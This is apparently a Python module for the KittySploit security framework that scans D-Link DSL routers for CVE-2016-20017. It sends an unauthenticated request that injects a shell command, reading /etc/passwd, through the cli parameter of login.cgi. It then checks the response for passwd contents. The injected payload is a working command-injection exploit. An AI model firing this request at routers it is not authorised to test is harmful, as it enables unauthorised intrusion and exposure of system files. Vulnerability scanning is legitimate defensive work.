#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DSL login.cgi CLI command injection (CVE-2016-20017)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DSL - login.cgi CLI RCE Detection (CVE-2016-20017)',
        'description': (
            'Detects CVE-2016-20017 by injecting cat /etc/passwd into login.cgi?cli= '
            'and checking for passwd contents.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2016', 'dlink', 'dsl', 'router', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2016-20017',
        ],
        'cve': 'CVE-2016-20017',
    }

    def run(self):
        path = "/login.cgi?cli=multilingual%20show%27;cat%20/etc/passwd%27$"
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        if re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='critical',
                reason='D-Link DSL login.cgi CLI RCE (CVE-2016-20017)',
                path='/login.cgi',
            )
            return True
        return False
